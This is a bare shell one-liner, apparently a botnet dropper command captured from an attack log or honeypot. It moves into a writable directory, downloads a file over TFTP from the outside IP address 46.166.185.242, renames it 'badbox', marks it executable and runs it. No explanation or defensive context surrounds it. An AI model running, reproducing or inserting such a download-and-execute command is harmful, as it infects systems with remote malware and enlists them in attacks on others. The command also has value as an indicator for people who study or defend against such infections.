cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 46.166.185.242;cat pftp >badbox;chmod +x *;./badbox
